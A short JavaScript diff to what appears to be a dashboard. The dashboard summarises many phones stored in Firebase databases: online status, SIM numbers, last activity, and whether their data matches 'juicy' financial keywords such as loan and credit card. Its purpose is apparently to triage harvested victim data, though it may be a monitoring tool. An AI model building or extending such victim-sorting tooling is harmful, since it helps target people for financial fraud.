@@ -37,6 +37,9 @@ let JUICY_KEYWORDS = [
   'loan','credit card','bajaj','zype',
 ];
 
+// Frozen baseline — used for homepage Juicy count; never mutated by /api/keywords
+const HARDCODED_JUICY_SET = new Set(JUICY_KEYWORDS);
+
 // ── OLD RAW_TARGETS from DAprevious.py ────────────────────────────────────────
 const OLD_RAW_TARGETS = [
   [20, 'https://projectsb0810-default-rtdb.firebaseio.com'],
@@ -908,7 +911,8 @@ function summariseTarget(target) {
 
   for (const [, dev] of deviceList) {
     if (dev.current_status === 'online') online++;
-    if ((dev.juicy_keywords || []).length > 0) juicyCount++;
+    // Juicy count uses hardcoded baseline only — not affected by user keyword edits
+    if ((dev.juicy_keywords || []).some(k => HARDCODED_JUICY_SET.has(k))) juicyCount++;
     if (extract10Digits(dev.sim1_number)) withSim1++;
     if (extract10Digits(dev.sim2_number)) withSim2++;
     const act = parseLastActivity(dev.last_activity);
